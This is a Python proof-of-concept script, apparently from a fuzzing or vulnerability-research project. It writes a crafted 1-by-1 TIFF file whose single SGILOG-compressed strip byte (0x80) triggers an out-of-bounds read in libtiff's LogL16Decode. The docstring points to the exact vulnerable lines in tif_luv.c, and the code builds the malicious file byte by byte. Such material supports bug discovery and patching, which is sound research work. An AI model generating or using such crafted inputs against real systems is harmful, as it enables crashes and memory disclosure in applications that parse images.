#!/usr/bin/env python3
"""
PoC generator for VULN 002: LogL16Decode() out-of-bounds read
File: libtiff/libtiff/tif_luv.c, lines 210-214

Trigger: StripByteCount=1, strip data byte >= 0x80 (enters run branch),
         then attempts to read 2nd byte (bp++) past buffer boundary.

Code path at line 211-214:
    if (*bp >= 128) {        // run branch - entered when byte >= 0x80
        rc = *bp++ + (2-128);
        b = (int16)(*bp++ << shft);  // <-- OOB read: cc was 1, bp now out of bounds
        cc -= 2;
"""
import struct
import os

out_dir = '/data/ylwang/non-textfuzz/target/_poc/libtiff/libtiff_tif_luv_c'
os.makedirs(out_dir, exist_ok=True)

entries = [
    (0x0100, 3, 1, 1),      # ImageWidth = 1
    (0x0101, 3, 1, 1),      # ImageLength = 1
    (0x0102, 3, 1, 16),     # BitsPerSample = 16
    (0x0103, 3, 1, 34676),  # Compression = SGILOG (34676 = 0x8774)
    (0x0106, 3, 1, 32844),  # PhotometricInterpretation = LOGL (32844 = 0x806C)
    (0x0111, 4, 1, 0),      # StripOffsets (placeholder, filled below)
    (0x0115, 3, 1, 1),      # SamplesPerPixel = 1
    (0x0116, 4, 1, 1),      # RowsPerStrip = 1
    (0x0117, 4, 1, 1),      # StripByteCounts = 1  <-- only 1 byte in strip
]

header_size = 8
ifd_offset = 8
n_entries = len(entries)
ifd_size = 2 + n_entries * 12 + 4
strip_data_offset = ifd_offset + ifd_size

# Single byte >= 0x80 triggers run branch in LogL16Decode
# The run branch then reads a 2nd byte (bp++) which is past the end of strip buffer
strip_data = bytes([0x80])  # 1 byte: >= 128, enters run branch

# Fix StripOffsets to point to actual data
for i, e in enumerate(entries):
    if e[0] == 0x0111:
        entries[i] = (0x0111, 4, 1, strip_data_offset)

ifd = struct.pack('<H', n_entries)
for tag, typ, count, value in entries:
    ifd += struct.pack('<HHII', tag, typ, count, value)
ifd += struct.pack('<I', 0)  # Next IFD offset = 0 (end)

header = b'II' + struct.pack('<HI', 42, ifd_offset)
tiff_data = header + ifd + strip_data

out_path = os.path.join(out_dir, 'vuln_002.tif')
with open(out_path, 'wb') as f:
    f.write(tiff_data)

print(f"Generated {out_path} ({len(tiff_data)} bytes)")
print(f"  IFD offset:        {ifd_offset}")
print(f"  IFD size:          {ifd_size}")
print(f"  Strip data offset: {strip_data_offset}")
print(f"  Strip data:        {strip_data.hex()} (1 byte >= 0x80 -> run branch)")
print(f"  Compression:       34676 (SGILOG)")
print(f"  Photometric:       32844 (LOGL)")
